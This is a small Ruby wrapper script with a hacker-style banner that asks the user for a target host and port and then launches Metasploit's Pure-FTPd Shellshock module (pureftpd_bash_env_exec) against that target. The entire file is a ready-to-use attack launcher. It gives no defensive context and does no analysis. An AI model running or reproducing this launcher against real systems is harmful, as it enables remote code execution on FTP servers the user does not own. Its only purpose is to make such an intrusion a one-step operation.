require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
   Pure-FTPd External Authentication Bash Environment
	      Variable Code Injection (Shellshock)
                       Linux x86
""".red
puts """
          Automatic Target Port 21
""".white
   

puts " [?] What is the target? ".blue
print "[!] ---> ".white

target = gets.chomp

puts " [?] What is the port? [Default 21] ".blue
print " [!] ---> ".yellow

port = gets.chomp

exec("msfconsole -x 'use exploit/multi/ftp/pureftpd_bash_env_exec' -x 'setg RHOST #{target}'  -x 'setg RPORT #{port}' -x 'run'")

